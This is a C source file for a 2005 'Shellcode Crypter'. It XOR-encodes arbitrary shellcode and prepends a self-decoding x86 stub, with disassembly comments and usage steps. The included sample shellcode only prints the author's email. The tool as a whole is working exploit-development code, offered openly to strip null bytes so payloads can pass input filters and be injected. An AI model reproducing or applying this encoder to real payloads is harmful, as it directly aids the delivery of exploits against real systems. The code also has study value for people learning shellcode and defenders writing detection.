
/*
 *  Shellcode Crypter v0.2 (Linux _ Windows)
 *    Coded by Shen139  31-07-2005
 *    shen139 (at_) eviltime [.dot.] com
 *
 * ...
 * //PUT HERE YOUR SHELLCODE
 * char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x0a\x68\x2e\x63\x6f\x6d\x68\x74\x69\x6d"
 * "\x65\x68\x65\x76\x69\x6c\x68\x31\x33\x39\x40\x68\x73\x68\x65\x6e\x89\xe1\xb2\x15\xb0\x04\xcd\x80\x31"
 * "\xc0\x31\xdb\xb0\x01\xcd\x80\xc3\x90\x90";
 * ...
 * 
 * Put tHERE your shellcode, then compile ("gcc sc.c -o sc") and run ("./sc") the program and copy the output!
 *
 * -[...You won't worry anymore for 0x00 in your shellcode...]-
 *
 * Enjoy :D
 *
 */

//PUT HERE YOUR SHELLCODE
char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x0a\x68\x2e\x63\x6f\x6d\x68\x74\x69\x6d"
"\x65\x68\x65\x76\x69\x6c\x68\x31\x33\x39\x40\x68\x73\x68\x65\x6e\x89\xe1\xb2\x15\xb0\x04\xcd\x80\x31"
"\xc0\x31\xdb\xb0\x01\xcd\x80\xc3\x90\x90";


//Set SHELLCODE_LENGHT with 0 if your shellcode does not contain \x00
// otherwise set it with the length of the shellcode
#define SHELLCODE_LENGHT  0

//UnComment this line and set the value used to xor the shellcode if you want to use an hard-coded one
// otherwise it will be calculated dynamically in manner that while xoring it doesn't generate 0x00
//#define HARDCODEDXOR      139


//Crypted_shellcode_length - Original_shellcode_length = 25 bytes
//MAGIC_SUFFIX_PARTa + MAGIC_SUFFIX_PARTb + MAGIC_SUFFIX_PARTc + xor_value + shellcode_length_value = 25 bytes
#define CIPHERLENGTH        25

#include <stdio.h>
#include <string.h>
#include <stdlib.h>


#define MAGIC_SUFFIX_PARTa    "\\x33\\xC9\\xEB\\x02\\xEB\\x05\\xE8\\xF9\\xFF\\xFF\\xFF\\x58\\x83\\xC0\\x0E\\x80\\x30"
/* AT&T
0x08049560 <shellcode+0>:        xor    %ecx,%ecx
0x08049562 <shellcode+2>:        jmp    0x8049566 <shellcode+6>
0x08049564 <shellcode+4>:        jmp    0x804956b <shellcode+11>
0x08049566 <shellcode+6>:        call   0x8049564 <shellcode+4>
0x0804956b <shellcode+11>:       pop    %eax
0x0804956c <shellcode+12>:       add    $0xe,%eax
0x0804956f <shellcode+15>:       xorb   Xor ,(%eax)
*/
// + XOR
#define MAGIC_SUFFIX_PARTb    "\\x40\\x41\\x83\\xF9"
/*
0x08049572 <shellcode+18>:       inc    %eax
0x08049573 <shellcode+19>:       inc    %ecx
0x08049574 <shellcode+20>:       cmp    shellcode_length ,%ecx
*/
// + Shellcode_length
#define MAGIC_SUFFIX_PARTc    "\\x75\\xF6"
/*
0x08049577 <shellcode+23>:       jne    0x804956f <shellcode+15>
*/

/* intel *
00401026 33 C9                xor         ecx, ecx
00401028 EB 02                jmp         label1 (0040102c) //  ------->----+
label2:                                                     //              |
0040102A EB 05                jmp         label3 (00401031) //   v <-+      v
label1:                                                     //   |   |      |
0040102C E8 F9 FF FF FF       call        label2 (0040102a) //   |   ^  <---+
label3:                                                     //   |
00401031 58                   pop         eax               // <-+
00401032 83 C0 0E             add         eax,0Eh
label3:
00401035 80 30 X              xor         byte ptr [eax], Xor   //<---+
00401038 40                   inc         eax                   //    |
00401039 41                   inc         ecx                   //    ^
0040103A 83 F9 Y              cmp         ecx,shellcode_length  //    |
0040103D 75 F6                jne         00401035              // ---+
                              .........
                              .........                         // Crypted shellcode
                              .........
*/


int main()
{
char*flShellcode=(char*)malloc(sizeof(shellcode)+4);
int i,b,SLLen,xor,found;

  printf("Shellcode Crypter2\n Coded by Shen139\n  shen139 (at) eviltime [dot] com\n\n\n");


  
  SLLen=(SHELLCODE_LENGHT==0)?strlen(shellcode):SHELLCODE_LENGHT;

  memcpy(flShellcode,shellcode,SLLen);

#ifndef HARDCODEDXOR
  for(xor=1;xor<=0xFF;xor++)
  {
    found=1;
    for(b=0;b<SLLen;b++)
    {
      if(flShellcode[b]==xor)
      {
        found=0;
        break;
      }
    }
    if(found==1)
      break;
  }
#else
  xor=HARDCODEDXOR;
#endif

  printf(" - Xoring with 0x%Xh (%dd)\n\n\n - Shellcode:\n\n",xor,xor);

  printf(MAGIC_SUFFIX_PARTa);

  printf("\\x%X",xor);

  printf(MAGIC_SUFFIX_PARTb);

  printf("\\x%X",SLLen);

  printf(MAGIC_SUFFIX_PARTc);



  for(i=0;i<SLLen;i++)
    printf("\\x%X",(unsigned char)shellcode[i]^xor);


  printf("\n\n");

  printf(" + Shellcode length:\n  - Original: %i bytes\n  - Crypted : %i bytes\n\n",SLLen,SLLen+CIPHERLENGTH);

return 0;
}

/*EOF*/



